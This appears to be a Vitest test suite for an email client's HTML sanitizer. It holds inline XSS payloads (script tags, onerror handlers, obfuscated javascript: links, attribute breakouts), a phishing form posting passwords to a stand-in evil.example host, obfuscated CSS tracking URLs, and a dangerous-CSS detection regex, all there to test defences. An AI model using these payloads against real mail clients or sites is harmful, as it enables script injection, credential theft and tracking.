// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml, sanitizeForQuote } from "../../../../home/apps/mail/src/html";
import { expectInert } from "./helpers";
import { HOSTILE_GROUPS } from "./hostile-corpus";

const DANGEROUS_CSS = /url\s*\(|@import|expression|position\s*:\s*(fixed|sticky|absolute)|@font-face|<|javascript:|behavior|binding/i;

describe("sanitizeEmailHtml on hostile mail", () => {
  for (const { group, cases } of HOSTILE_GROUPS) {
    describe(group, () => {
      for (const hostile of cases) {
        it(`neutralises: ${hostile.name}`, () => {
          for (const remoteImages of ["block", "allow"] as const) {
            const result = sanitizeEmailHtml(hostile.html, { remoteImages, quotes: "show" });
            expectInert(result.html);
            expect(DANGEROUS_CSS.test(result.css), `dangerous sheet: ${result.css}`).toBe(false);
          }
          expectInert(sanitizeForQuote(hostile.html));
        });
      }
    });
  }

  it("keeps the readable text around removed markup", () => {
    expect(sanitizeEmailHtml("<p>hello</p><script>alert(1)</script><p>world</p>").html).toContain("<p>hello</p><p>world</p>");
    const unknown = expectInert(sanitizeEmailHtml("<x-widget onclick=alert(1)><script>alert(1)</script>kept</x-widget>").html);
    expect(unknown.textContent).toBe("kept");
    expect(unknown.querySelector("x-widget")).toBeNull();
  });

  it("removes scripts without leaving their source behind as text", () => {
    const body = expectInert(sanitizeEmailHtml("<div>a<script>var secret = 'alert(1)'</script><style>p{color:red}</style>b</div>").html);
    expect(body.textContent).toBe("ab");
  });

  it("keeps a phishing form's wording but none of its controls or its target", () => {
    const result = sanitizeEmailHtml(
      '<form action="https://evil.example/steal" method="post"><p>Your session expired.</p><input name="password" type="password"><button>Sign in</button></form>',
    );
    const body = expectInert(result.html);
    expect(body.textContent).toContain("Your session expired.");
    expect(body.textContent).not.toContain("Sign in");
    expect(result.html).not.toContain("evil.example");
  });

  it("drops a link's unsafe destination but keeps its text", () => {
    const body = expectInert(sanitizeEmailHtml('<a href="jav&#x09;ascript:alert(1)" title="Totally safe">Click here</a>').html);
    const link = body.querySelector("a");
    expect(link?.hasAttribute("href")).toBe(false);
    expect(link?.textContent).toBe("Click here");
  });

  it("shows the real destination of a link, not the sender's tooltip", () => {
    const body = expectInert(sanitizeEmailHtml('<a href="https://evil.example/login" title="https://bank.example">bank.example</a>').html);
    expect(body.querySelector("a")?.getAttribute("title")).toBe("https://evil.example/login");
  });

  it("writes no attribute value that could be read as markup", () => {
    const html = '<p title="</noscript><img src=x onerror=alert(1)>" aria-label="--><script>alert(1)</script>">x</p>' +
      '<img src="https://ok.example/a.png" alt="&quot;><img src=x onerror=alert(1)>"><a href="mailto:<script>alert(1)</script>@evil.example">m</a>' +
      '<a href="mailto:ada@example.com?subject=<b>hi</b>">n</a><font face="<x>">f</font>';
    const result = sanitizeEmailHtml(html, { remoteImages: "allow" });
    const body = expectInert(result.html);
    for (const element of Array.from(body.querySelectorAll("*"))) {
      for (const attribute of Array.from(element.attributes)) expect(attribute.value, attribute.name).not.toMatch(/[<>]/);
    }
    expect(body.querySelectorAll("a[href]").length).toBe(1);
    expect(body.querySelector("a[href]")?.getAttribute("href")).toBe("mailto:ada@example.com?subject=%3Cb%3Ehi%3C/b%3E");
  });

  it("leaves no style at all when the CSS is obfuscated", () => {
    for (const style of [
      "width: EXPRE/**/SSION(alert(1))",
      "background-image:\\75\\72\\6c(https://evil.example/t)",
      "background-image:\\000075 rl(https://evil.example/t)",
      "background:u/**/rl(https://evil.example/t)",
      "background-image:image-set('https://evil.example/t' 1x)",
      "position:\\66ixed !important;pos\\69tion:fixed",
      "color:red;}</style><script>alert(1)</script",
    ]) {
      const body = expectInert(sanitizeEmailHtml(`<div style="${style}">x</div>`).html);
      const kept = body.querySelector("div div")?.getAttribute("style") ?? "";
      expect(kept === "" || kept === "color:red", `${style} -> ${kept}`).toBe(true);
    }
  });

  it("does not let mail reuse the reserved class prefix", () => {
    const body = expectInert(sanitizeEmailHtml('<div class="mx-image-blocked promo mx-body">x</div>').html);
    expect(body.querySelector(".promo")?.className).toBe("promo");
  });

  it("removes svg and math together with what they contain", () => {
    const body = expectInert(sanitizeEmailHtml('<p>a</p><svg><foreignObject><p>inside</p></foreignObject><text>label</text></svg><math><mi>x</mi></math><p>b</p>').html);
    expect(body.textContent).toBe("ab");
  });

  it("survives input that is not a string or is enormous", { timeout: 30_000 }, () => {
    expect(sanitizeEmailHtml(undefined as unknown as string).html).toBe("");
    expect(sanitizeEmailHtml(null as unknown as string).html).toBe("");
    const huge = sanitizeEmailHtml(`<p>${"a".repeat(100_000)}</p>`.repeat(35));
    expect(huge.truncated).toBe(true);
    expectInert(huge.html);
    const many = sanitizeEmailHtml("<b>x</b>".repeat(30_000));
    expect(many.truncated).toBe(true);
    expect(expectInert(many.html).querySelectorAll("b").length).toBeLessThan(30_000);
  });

  it("flattens extreme nesting instead of overflowing the stack", { timeout: 30_000 }, () => {
    const result = sanitizeEmailHtml(`${"<div>".repeat(2000)}deep text<script>alert(1)</script>${"</div>".repeat(2000)}`);
    const body = expectInert(result.html);
    expect(body.textContent).toBe("deep text");
    expect(body.querySelectorAll("div").length).toBeLessThanOrEqual(101);
  });
});
